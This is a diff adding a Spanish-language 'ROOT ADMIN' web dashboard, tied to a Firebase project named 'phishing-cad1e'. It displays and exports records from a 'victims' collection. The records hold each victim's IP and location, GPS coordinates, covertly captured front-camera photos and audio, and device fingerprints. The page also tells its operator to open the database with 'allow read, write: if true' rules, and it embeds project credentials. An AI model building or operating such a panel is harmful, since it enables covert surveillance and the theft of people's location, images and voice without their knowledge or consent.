@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>ROOT ADMIN</title>
+<style>
+:root{
+  --bg:#080808; --bg2:#0f0f0f; --bg3:#161616;
+  --border:#1e1e1e; --accent:#EE1D52; --a2:#69C9D0;
+  --text:#c8c8c8; --dim:#555;
+  --green:#22c55e; --yellow:#eab308; --purple:#a855f7;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:.875rem;min-height:100vh;}
+
+/* ── Header ── */
+header{
+  background:var(--bg2);border-bottom:1px solid var(--border);
+  padding:13px 18px;display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:100;
+}
+.logo{font-size:.95rem;font-weight:700;letter-spacing:2px;}
+.logo span{color:var(--accent);}
+#status-wrap{display:flex;align-items:center;gap:6px;font-size:.76rem;color:var(--dim);}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--dim);transition:background .3s;}
+.dot.live{background:var(--green);animation:pulse 1.5s infinite;}
+.dot.err{background:var(--accent);}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* ── Stats bar ── */
+#stats{display:flex;gap:1px;background:var(--border);border-bottom:1px solid var(--border);overflow-x:auto;}
+.sc{flex:1;min-width:60px;background:var(--bg2);padding:10px 6px;text-align:center;}
+.sc .v{font-size:1.25rem;font-weight:700;color:var(--accent);}
+.sc .l{font-size:.57rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px;margin-top:2px;}
+
+/* ── Toolbar ── */
+#toolbar{
+  padding:10px 14px;display:flex;gap:8px;flex-wrap:wrap;
+  border-bottom:1px solid var(--border);background:var(--bg2);
+}
+#sb{
+  flex:1;min-width:150px;background:var(--bg3);border:1px solid var(--border);
+  border-radius:7px;padding:8px 12px;color:var(--text);font-size:.83rem;outline:none;
+}
+#sb:focus{border-color:var(--a2);}
+.tb{
+  background:var(--bg3);border:1px solid var(--border);color:var(--dim);
+  padding:8px 11px;border-radius:7px;font-size:.72rem;cursor:pointer;
+  transition:all .2s;white-space:nowrap;
+}
+.tb:hover{border-color:var(--accent);color:var(--accent);}
+#bclear{border-color:#3a1010;color:#7a2020;}
+#bclear:hover{border-color:var(--accent);color:var(--accent);}
+
+/* ── Main ── */
+main{padding:13px 14px;}
+#entries{display:flex;flex-direction:column;gap:10px;}
+.empty{text-align:center;color:var(--dim);padding:60px 20px;font-size:.8rem;line-height:2.2;}
+.spin{
+  width:34px;height:34px;border:3px solid var(--border);
+  border-top-color:var(--accent);border-radius:50%;
+  animation:sp .8s linear infinite;margin:0 auto 14px;
+}
+@keyframes sp{to{transform:rotate(360deg)}}
+.err-box{
+  background:#1a0808;border:1px solid #3a1010;border-radius:10px;
+  padding:18px;margin:10px 0;font-size:.8rem;line-height:1.8;color:#c8c8c8;
+}
+.err-box code{
+  display:block;background:#0d0d0d;border:1px solid #2a2a2a;border-radius:6px;
+  padding:10px 12px;margin:8px 0;color:var(--a2);font-size:.75rem;white-space:pre;
+}
+
+/* ── Cards ── */
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:10px;overflow:hidden;transition:border-color .3s;}
+.card.new{animation:newping .8s ease;}
+@keyframes newping{0%{border-color:var(--accent);box-shadow:0 0 18px rgba(238,29,82,.35);}100%{border-color:var(--border);box-shadow:none;}}
+.ch{display:flex;align-items:center;gap:8px;padding:11px 14px;cursor:pointer;background:var(--bg3);flex-wrap:wrap;}
+.ch:hover{background:#1a1a1a;}
+.chash{font-family:monospace;font-size:.77rem;color:var(--accent);background:rgba(238,29,82,.09);padding:2px 7px;border-radius:4px;}
+.cip{font-family:monospace;font-size:.82rem;color:var(--a2);font-weight:600;}
+.cloc{font-size:.73rem;color:var(--dim);flex:1;}
+.cts{font-size:.65rem;color:var(--dim);white-space:nowrap;}
+.carr{color:var(--dim);font-size:.75rem;transition:transform .2s;}
+.carr.o{transform:rotate(90deg);}
+
+/* ── Card body ── */
+.cb{display:none;padding:13px;border-top:1px solid var(--border);}
+.cb.o{display:block;}
+.st{font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1.5px;margin:12px 0 6px;border-bottom:1px solid var(--border);padding-bottom:4px;}
+.st:first-child{margin-top:0;}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:4px 12px;}
+.fr{display:flex;flex-direction:column;padding:3px 0;}
+.fl{font-size:.58rem;color:#333;text-transform:uppercase;letter-spacing:.6px;}
+.fv{font-size:.78rem;color:#bbb;word-break:break-all;margin-top:2px;font-family:monospace;}
+.fv.a{color:var(--accent);font-weight:600;}
+.fv.a2{color:var(--a2);font-weight:600;}
+.fv.g{color:var(--green);font-weight:600;}
+.fv.y{color:var(--yellow);}
+.fv.p{color:var(--purple);}
+.fv.d{color:var(--dim);}
+
+/* ── Badges ── */
+.badge{display:inline-block;padding:1px 5px;border-radius:3px;font-size:.57rem;font-weight:600;text-transform:uppercase;margin-left:3px;vertical-align:middle;}
+.bg{background:rgba(34,197,94,.12);color:var(--green);}
+.by{background:rgba(234,179,8,.12);color:var(--yellow);}
+.ba2{background:rgba(105,201,208,.12);color:var(--a2);}
+
+/* ── Media ── */
+.mlink{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:6px 10px;color:var(--a2);font-size:.75rem;text-decoration:none;margin-top:7px;}
+.mlink:hover{border-color:var(--a2);}
+.acts{display:flex;gap:7px;margin-top:11px;flex-wrap:wrap;}
+.btn{background:var(--bg3);border:1px solid var(--border);color:var(--dim);padding:6px 11px;border-radius:6px;font-size:.72rem;cursor:pointer;transition:all .2s;text-decoration:none;display:inline-block;}
+.btn:hover{border-color:var(--accent);color:var(--accent);}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo"><span>ROOT</span> ADMIN</div>
+  <div id="status-wrap"><span class="dot" id="dot"></span><span id="stxt">conectando...</span></div>
+</header>
+
+<div id="stats">
+  <div class="sc"><div class="v" id="s0">0</div><div class="l">Total</div></div>
+  <div class="sc"><div class="v" id="s1">0</div><div class="l">Hoy</div></div>
+  <div class="sc"><div class="v" id="s2">0</div><div class="l">GPS</div></div>
+  <div class="sc"><div class="v" id="s3">0</div><div class="l">Foto</div></div>
+  <div class="sc"><div class="v" id="s4">0</div><div class="l">Audio</div></div>
+  <div class="sc"><div class="v" id="s5">0</div><div class="l">Países</div></div>
+</div>
+
+<div id="toolbar">
+  <input id="sb" placeholder="🔍  IP, país, hash..." oninput="fil()">
+  <button class="tb" onclick="xCSV()">⬇ CSV</button>
+  <button class="tb" onclick="xJSON()">⬇ JSON</button>
+  <button class="tb" id="bsort" onclick="tSort()">↓ Recientes</button>
+  <button class="tb" id="bclear" onclick="clearAll()">🗑 Vaciar</button>
+</div>
+
+<main><div id="entries"><div class="empty"><div class="spin"></div>Conectando...</div></div></main>
+
+<!-- Firebase SDK compat (NO es module → funciona en GitHub Pages sin CORS issues) -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+
+<script>
+// ─── CONFIG ───────────────────────────────────────────────────
+const FB = firebase.initializeApp({
+  apiKey:            'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0',
+  authDomain:        'phishing-cad1e.firebaseapp.com',
+  projectId:         'phishing-cad1e',
+  storageBucket:     'phishing-cad1e.firebasestorage.app',
+  messagingSenderId: '48855278637',
+  appId:             '1:48855278637:web:cd6386bf2342f0b63344a4'
+});
+const db = firebase.firestore();
+
+// ─── ESTADO ───────────────────────────────────────────────────
+let all  = [];
+let desc = true;
+
+// ─── STATUS ───────────────────────────────────────────────────
+function status(msg, state) {           // state: 'live' | 'err' | ''
+  document.getElementById('stxt').textContent = msg;
+  const d = document.getElementById('dot');
+  d.className = 'dot' + (state === 'live' ? ' live' : state === 'err' ? ' err' : '');
+}
+
+// ─── TIMEOUT si Firebase no responde en 10s ───────────────────
+const _tout = setTimeout(() => {
+  status('sin respuesta — revisa Firestore Rules', 'err');
+  document.getElementById('entries').innerHTML = `
+    <div class="err-box">
+      ⚠️ Firebase no responde después de 10 segundos.<br><br>
+      <b>Solución: Firebase Console → Firestore Database → Rules</b>
+      <code>rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    match /{document=**} {
+      allow read, write: if true;
+    }
+  }
+}</code>
+      Publica esas reglas y recarga esta página.
+    </div>`;
+}, 10000);
+
+// ─── LISTENER REALTIME ────────────────────────────────────────
+db.collection('victims')
+  .onSnapshot(
+    snap => {
+      clearTimeout(_tout);
+      all = snap.docs.map(d => ({ id: d.id, data: d.data() }));
+      sort(); render(); calcStats();
+      status(`live — ${all.length} entradas`, 'live');
+    },
+    err => {
+      clearTimeout(_tout);
+      const hint =
+        err.code === 'permission-denied' ? ' → Firestore Rules bloqueando' :
+        err.code === 'unavailable'       ? ' → Firestore no activado'      : '';
+      status(`${err.code}${hint}`, 'err');
+      document.getElementById('entries').innerHTML = `
+        <div class="err-box">
+          ❌ <b>${err.code}</b>${hint}<br>
+          <small style="color:#555">${err.message}</small>
+          ${err.code === 'permission-denied' ? `<code>allow read, write: if true;</code>` : ''}
+        </div>`;
+    }
+  );
+
+// ─── SORT ─────────────────────────────────────────────────────
+function sort() {
+  all.sort((a, b) => {
+    const ta = Number(a.data.ts || 0), tb = Number(b.data.ts || 0);
+    return desc ? tb - ta : ta - tb;
+  });
+}
+window.tSort = () => {
+  desc = !desc;
+  document.getElementById('bsort').textContent = desc ? '↓ Recientes' : '↑ Antiguos';
+  sort(); render();
+};
+
+// ─── STATS ────────────────────────────────────────────────────
+function calcStats() {
+  const today = new Date().toDateString();
+  const paises = new Set();
+  let hoy = 0, gps = 0, foto = 0, audio = 0;
+  for (const { data: d } of all) {
+    if (d.ts && new Date(Number(d.ts)).toDateString() === today) hoy++;
+    if (ok(d.gpsLat) || ok(d.lat))     gps++;
+    if (ok(d.photoUrl))                foto++;
+    if (ok(d.audioUrl))                audio++;
+    const c = d.country || d.cc;
+    if (c) paises.add(c);
+  }
+  sv('s0', all.length); sv('s1', hoy);
+  sv('s2', gps);        sv('s3', foto);
+  sv('s4', audio);      sv('s5', paises.size);
+}
+const sv  = (id, v) => document.getElementById(id).textContent = v;
+const ok  = v => v && v !== '' && v !== 'null' && v !== 'undefined' && v !== 'n/a';
+
+// ─── FILTER ───────────────────────────────────────────────────
+window.fil = () => render(document.getElementById('sb').value.toLowerCase());
+
+// ─── RENDER ───────────────────────────────────────────────────
+function render(f = '') {
+  const box  = document.getElementById('entries');
+  const list = f
+    ? all.filter(({ data: d }) => Object.values(d).some(v => String(v).toLowerCase().includes(f)))
+    : all;
+  if (!list.length) {
+    box.innerHTML = `<div class="empty">${f
+      ? `Sin resultados para "${f}"`
+      : '<div class="spin"></div>Esperando entradas...'}</div>`;
+    return;
+  }
+  box.innerHTML = list.map(({ id, data: d }) => card(id, d)).join('');
+}
+
+// ─── CARD ─────────────────────────────────────────────────────
+function card(id, d) {
+  const ts  = ok(d.ts) ? new Date(Number(d.ts)).toLocaleString('es') : '—';
+  const ip  = d.ip || '?';
+  const loc = [d.city, d.country].filter(v => ok(v)).join(', ') || '—';
+  const hsh = id.slice(0, 8);
+
+  const hasGPS   = ok(d.gpsLat) || ok(d.lat);
+  const hasPhoto = ok(d.photoUrl);
+  const hasAudio = ok(d.audioUrl);
+  const lat = d.gpsLat || d.lat || '';
+  const lon = d.gpsLon || d.lon || '';
+
+  const badges = [
+    hasGPS   ? '<span class="badge by">GPS</span>'   : '',
+    hasPhoto ? '<span class="badge ba2">📷</span>'   : '',
+    hasAudio ? '<span class="badge bg">🎙</span>'    : '',
+  ].join('');
+
+  const F = (pairs) => pairs.map(([k, cls]) => {
+    const v = d[k];
+    return `<div class="fr">
+      <span class="fl">${k}</span>
+      <span class="fv ${cls || ''}">${ok(v) ? String(v).slice(0, 300) : '—'}</span>
+    </div>`;
+  }).join('');
+
+  const gmap = hasGPS && lat
+    ? `<a class="mlink" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">🗺 Mapa (${Number(lat).toFixed(5)}, ${Number(lon).toFixed(5)})</a>`
+    : '';
+
+  return `<div class="card" id="c-${id}">
+  <div class="ch" onclick="tog('${id}')">
+    <span class="chash">${hsh}</span>
+    <span class="cip">${ip}</span>
+    <span class="cloc">${loc}${badges}</span>
+    <span class="cts">${ts}</span>
+    <span class="carr" id="ar-${id}">▶</span>
+  </div>
+  <div class="cb" id="cb-${id}">
+
+    <div class="st">🌐 Red</div>
+    <div class="grid">${F([['ip','a'],['city',''],['region',''],['country',''],['cc',''],['lat','d'],['lon','d'],['org','d']])}</div>
+
+    ${hasGPS ? `
+    <div class="st">📍 GPS real</div>
+    <div class="grid">${F([['gpsLat','g'],['gpsLon','g'],['gpsAcc',''],['gpsAlt','']])}</div>
+    ${gmap}` : ''}
+
+    ${hasPhoto ? `
+    <div class="st">📷 Foto cámara frontal</div>
+    <a href="${d.photoUrl}" target="_blank">
+      <img src="${d.photoUrl}" style="max-width:220px;max-height:180px;border-radius:8px;border:1px solid #2a2a2a;margin-top:6px;" onerror="this.style.display='none'">
+    </a>` : ''}
+
+    ${hasAudio ? `
+    <div class="st">🎙 Audio</div>
+    <audio controls src="${d.audioUrl}" style="margin-top:6px;width:100%;max-width:300px;"></audio>` : ''}
+
+    <div class="st">🖥 Dispositivo</div>
+    <div class="grid">${F([['ua','d'],['platform',''],['vendor',''],['screen',''],['cores',''],['memory',''],['touch',''],['lang',''],['tz',''],['dark',''],['bat','y'],['batChg',''],['connType',''],['connDl',''],['connRtt','']])}</div>
+
+    <div class="st">🔬 Fingerprint</div>
+    <div class="grid">${F([['canvas','d'],['glVendor',''],['glRenderer',''],['online',''],['notif','y']])}</div>
+
+    <div class="st">⚙ Meta</div>
+    <div class="grid">${F([['ts','d'],['clicked',''],['denied',''],['camGranted',''],['camErr','d'],['gpsErr','d'],['_exit','d']])}</div>
+
+    <div class="acts">
+      <button class="btn" onclick="cpJSON('${id}')">📋 JSON</button>
+      <button class="btn" onclick="cpIP('${id}')">📌 IP</button>
+      ${hasGPS && lat ? `<a class="btn" href="https://maps.google.com/?q=${lat},${lon}" target="_blank">🗺</a>` : ''}
+      <button class="btn" style="margin-left:auto" onclick="del('${id}')">🗑</button>
+    </div>
+  </div>
+</div>`;
+}
+
+// ─── ACCIONES ─────────────────────────────────────────────────
+window.tog = id => {
+  document.getElementById('cb-'  + id).classList.toggle('o');
+  document.getElementById('ar-' + id).classList.toggle('o');
+};
+
+window.cpJSON = id => {
+  const e = all.find(x => x.id === id);
+  if (!e) return;
+  const t = JSON.stringify(e.data, null, 2);
+  navigator.clipboard?.writeText(t).catch(() => legacyCopy(t));
+  flash(id, '✓');
+};
+
+window.cpIP = id => {
+  const e = all.find(x => x.id === id);
+  if (!e) return;
+  navigator.clipboard?.writeText(e.data.ip || '').catch(() => {});
+};
+
+function flash(id, txt) {
+  const b = document.querySelector(`#c-${id} .btn`);
+  if (b) { const orig = b.textContent; b.textContent = txt; setTimeout(() => b.textContent = orig, 1500); }
+}
+
+function legacyCopy(t) {
+  const a = document.createElement('textarea');
+  a.value = t; document.body.appendChild(a); a.select();
+  document.execCommand('copy'); document.body.removeChild(a);
+}
+
+window.del = async id => {
+  if (!confirm('¿Eliminar esta entrada?')) return;
+  try { await db.collection('victims').doc(id).delete(); }
+  catch (e) { alert('Error: ' + e.message); }
+};
+
+window.clearAll = async () => {
+  if (!all.length) { alert('Ya está vacío.'); return; }
+  if (!confirm(`¿Eliminar las ${all.length} entradas? No hay vuelta atrás.`)) return;
+  const btn = document.getElementById('bclear');
+  btn.textContent = 'Vaciando...'; btn.disabled = true;
+  try { await Promise.all(all.map(e => db.collection('victims').doc(e.id).delete())); }
+  catch (e) { alert('Error: ' + e.message); }
+  btn.textContent = '🗑 Vaciar'; btn.disabled = false;
+};
+
+// ─── EXPORT ───────────────────────────────────────────────────
+window.xCSV = () => {
+  if (!all.length) { alert('Sin datos.'); return; }
+  const keys = [...new Set(all.flatMap(e => Object.keys(e.data)))].sort();
+  const esc  = v => '"' + String(v ?? '').replace(/"/g, '""') + '"';
+  const rows = [
+    ['id', ...keys].map(esc).join(','),
+    ...all.map(e => [esc(e.id), ...keys.map(k => esc(e.data[k] ?? ''))].join(','))
+  ].join('\r\n');
+  dl('victims_' + Date.now() + '.csv', rows, 'text/csv');
+};
+
+window.xJSON = () => {
+  if (!all.length) { alert('Sin datos.'); return; }
+  dl('victims_' + Date.now() + '.json',
+    JSON.stringify(all.map(e => ({ id: e.id, ...e.data })), null, 2),
+    'application/json');
+};
+
+function dl(name, content, mime) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([content], { type: mime }));
+  a.download = name; document.body.appendChild(a); a.click(); document.body.removeChild(a);
+}
+</script>
+</body>
+</html>
